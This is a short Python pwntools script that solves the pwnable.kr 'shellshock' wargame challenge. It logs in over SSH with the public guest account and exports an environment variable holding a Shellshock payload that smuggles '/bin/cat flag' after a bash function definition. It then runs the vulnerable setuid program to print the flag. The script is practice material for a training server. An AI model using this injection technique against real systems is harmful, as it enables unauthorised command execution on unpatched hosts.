#!/usr/bin/python3


from pwn import *


magic = '() { :;};'
payload = '/bin/cat flag'

con = ssh(host='pwnable.kr', port=2222, user='shellshock', password='guest')

# Open the vulnerable bash shell.
shell = con.process(['./bash'])
shell.recvuntil('$ ')

# Send the payload
shell.sendline("export x='() { :;}; /bin/cat flag '")
shell.recvuntil('$ ')

# Get the flag
shell.sendline('./shellshock')
print('[+] flag = {}'.format(shell.recv(1024).decode()))